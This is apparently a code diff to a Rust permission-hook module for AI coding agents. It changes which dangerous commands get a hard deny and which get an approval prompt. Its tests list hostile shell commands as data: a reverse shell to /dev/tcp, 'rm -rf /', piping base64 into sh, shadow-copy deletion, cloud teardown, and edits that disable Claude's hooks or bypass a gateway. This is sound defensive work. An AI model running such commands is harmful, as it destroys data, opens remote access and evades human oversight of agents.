@@ -11,8 +11,14 @@
 //! | Decision                    | Claude stdout                                      | Claude exit | Cursor stdout                         | Cursor exit |
 //! |-----------------------------|----------------------------------------------------|-------------|---------------------------------------|-------------|
 //! | Allow / Warn                | (empty)                                            | 0           | `{"permission":"allow"}`              | 0           |
-//! | Approval / Identity         | `hookSpecificOutput.permissionDecision: ask`       | 0           | `{"permission":"ask"}`                | 0           |
-//! | Block                       | `hookSpecificOutput.permissionDecision: deny`      | 2           | `{"permission":"deny"}`               | 2           |
+//! | Approval / Identity / Block | `hookSpecificOutput.permissionDecision: ask`       | 0           | `{"permission":"ask"}`                | 0           |
+//! | Hard block (listed rule)    | `hookSpecificOutput.permissionDecision: deny`      | 2           | `{"permission":"deny"}`               | 2           |
+//!
+//! A Block only stays a deny when its rule is on the hard-block list
+//! (`policy.hard_block`, a rule's `hard_block: true`, or
+//! `APERION_SHIELD_HARD_BLOCK`), for the killswitch, or for the offload
+//! gate. Everything else asks, because agents run in sandboxes and
+//! scratch VMs where a "dangerous" command is often the job.
 //!
 //! Exit 2 is treated as deny by both hosts — never use it for ask.
 //! Cursor only *enforces* ask on `beforeShellExecution` / `beforeMCPExecution`
@@ -506,7 +512,17 @@ pub fn run_with_offload(
     let burst = BurstDetector::new(engine.policy.burst_detector.clone());
 
     let calls = canonical_calls(&tool_name, &input);
-    let mut best = Decision::Allow;
+    let mut best = if crate::orgmode::killswitch_latched() {
+        Decision::Block {
+            rule_id: "killswitch".into(),
+            severity: Severity::Critical,
+            reason: "Smartflow killswitch is on".into(),
+            safer_alternative: None,
+            contributing_rules: Vec::new(),
+        }
+    } else {
+        Decision::Allow
+    };
     let mut canonical_tool = calls
         .first()
         .map(|(t, _)| t.clone())
@@ -583,12 +599,9 @@ pub fn run_with_offload(
         }
     }
 
-    // IDE hooks: a hard deny is for rules written as Critical (rm -rf,
-    // reverse shell, drop database, turn Shield off). A High rule that
-    // the taint/prod/burst bump pushed up to Critical is a judgment
-    // call. Cursor's beforeShellExecution / beforeMCPExecution and
-    // Claude's PreToolUse both prompt on `ask`, and ignore that prompt
-    // if we exit 2 with `deny`.
+    // IDE hooks: only hard-block rules deny. Cursor's beforeShellExecution /
+    // beforeMCPExecution and Claude's PreToolUse both prompt on `ask`, and
+    // skip the prompt if we exit 2 with `deny`.
     best = soften_non_attack(engine, best);
 
     let reason = decision_reason(&best);
@@ -640,10 +653,29 @@ fn egress_ask() -> Decision {
     }
 }
 
-/// Keep a hard deny when the rule was written as Critical. Anything
-/// else that landed on Block (a bump, composite points) becomes the
-/// same ask prompt git push and other High actions already use.
+/// Keep a hard deny for hard-block rules, the killswitch, and the offload
+/// gate. Every other Block becomes the same approve / deny prompt that
+/// High rules use.
 fn soften_non_attack(engine: &Engine, decision: Decision) -> Decision {
+    if let Decision::Approval {
+        rule_id,
+        severity,
+        reason,
+        safer_alternative,
+        contributing_rules,
+    } = &decision
+    {
+        if engine.is_hard_block(rule_id) {
+            return Decision::Block {
+                rule_id: rule_id.clone(),
+                severity: *severity,
+                reason: reason.clone(),
+                safer_alternative: safer_alternative.clone(),
+                contributing_rules: contributing_rules.clone(),
+            };
+        }
+        return decision;
+    }
     let Decision::Block {
         severity,
         rule_id,
@@ -654,23 +686,12 @@ fn soften_non_attack(engine: &Engine, decision: Decision) -> Decision {
     else {
         return decision;
     };
-    // The offload gate is an intentional deny at Low. Only a decision
-    // that landed on Critical because something bumped it should ask.
-    if severity != Severity::Critical {
-        return decision;
-    }
-    let authored_critical = engine
-        .rules
-        .iter()
-        .find(|r| r.id == rule_id)
-        .map(|r| r.severity == Severity::Critical)
-        .unwrap_or(false);
-    if authored_critical {
+    if rule_id == offload::RULE_ID || engine.is_hard_block(&rule_id) {
         return decision;
     }
     Decision::Approval {
         rule_id,
-        severity: Severity::High,
+        severity,
         reason,
         safer_alternative,
         contributing_rules,
@@ -720,17 +741,101 @@ mod tests {
     }
 
     #[test]
-    fn bash_rm_rf_root_blocks_claude() {
+    fn bash_rm_rf_root_asks_claude() {
         let report = eval_named("Bash", json!({"command": "rm -rf /"}), HookDialect::Claude);
         assert!(
-            report.decision.is_blocking(),
+            matches!(report.decision, Decision::Approval { .. }),
             "decision={:?}",
             report.decision
         );
-        assert_eq!(report.exit_code(), 2);
-        assert!(report.stdout.contains("permissionDecision"));
-        assert!(report.stdout.contains("deny"));
+        assert_eq!(report.exit_code(), 0);
+        assert!(report.stdout.contains("\"permissionDecision\":\"ask\""));
         assert!(!report.stdout.contains("\"permission\":"));
+    }
+
+    #[test]
+    fn hard_block_rule_denies_in_both_dialects() {
+        let cmd = json!({"command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"});
+        let claude = eval_named("Bash", cmd.clone(), HookDialect::Claude);
+        assert!(matches!(claude.decision, Decision::Block { .. }), "{:?}", claude.decision);
+        assert_eq!(claude.exit_code(), 2);
+        assert!(claude.stdout.contains("\"permissionDecision\":\"deny\""));
+
+        let cursor = eval_named("Shell", cmd, HookDialect::Cursor);
+        assert_eq!(cursor.exit_code(), 2);
+        assert!(cursor.stdout.contains("\"permission\":\"deny\""));
+    }
+
+    #[test]
+    fn claude_settings_edit_is_hard_denied() {
+        for path in [
+            "/Users/a/.claude/settings.local.json",
+            "/Library/Application Support/ClaudeCode/managed-settings.json",
+        ] {
+            let r = eval_named("Write", json!({"file_path": path}), HookDialect::Claude);
+            assert_eq!(r.exit_code(), 2, "{path}: {:?}", r.decision);
+        }
+        let r = eval_named(
+            "Bash",
+            json!({"command": "jq '.disableAllHooks=true' x > y"}),
+            HookDialect::Claude,
+        );
+        assert_eq!(r.exit_code(), 2, "{:?}", r.decision);
+    }
+
+    #[test]
+    fn extended_rules_ask_not_deny() {
+        for cmd in [
+            "rm -rf /home",
+            "aws ec2 terminate-instances --instance-ids i-1",
+            "az keyvault purge --name kv1",
+            "kubectl delete pvc --all -n prod",
+            "docker run --privileged -v /:/host alpine",
+            "vssadmin delete shadows /all /quiet",
+            "echo aGk= | base64 -d | sh",
+            "ngrok http 3000",
+            "claude --dangerously-skip-permissions -p 'fix it'",
+        ] {
+            let r = eval_named("Bash", json!({"command": cmd}), HookDialect::Claude);
+            assert!(
+                matches!(r.decision, Decision::Approval { .. }),
+                "{cmd}: {:?}",
+                r.decision
+            );
+            assert_eq!(r.exit_code(), 0, "{cmd}");
+            assert!(r.stdout.contains("\"permissionDecision\":\"ask\""), "{cmd}");
+        }
+    }
+
+    #[test]
+    fn gateway_bypass_is_hard_denied() {
+        let r = eval_named(
+            "Bash",
+            json!({"command": "export ANTHROPIC_BASE_URL=https://api.anthropic.com && claude"}),
+            HookDialect::Claude,
+        );
+        assert_eq!(r.exit_code(), 2, "{:?}", r.decision);
+    }
+
+    #[test]
+    fn everyday_commands_still_allow() {
+        for cmd in [
+            "rm -rf ./build",
+            "rm -rf node_modules",
+            "git push origin feature/x",
+            "kubectl get pods -n prod",
+            "aws s3 ls",
+            "docker run --rm -v $PWD:/src node:20 npm test",
+            "cat /etc/passwd | wc -l",
+            "python -m pytest",
+        ] {
+            let r = eval_named("Bash", json!({"command": cmd}), HookDialect::Claude);
+            assert!(
+                !r.decision.is_blocking(),
+                "{cmd}: {:?}",
+                r.decision
+            );
+        }
     }
 
     #[test]
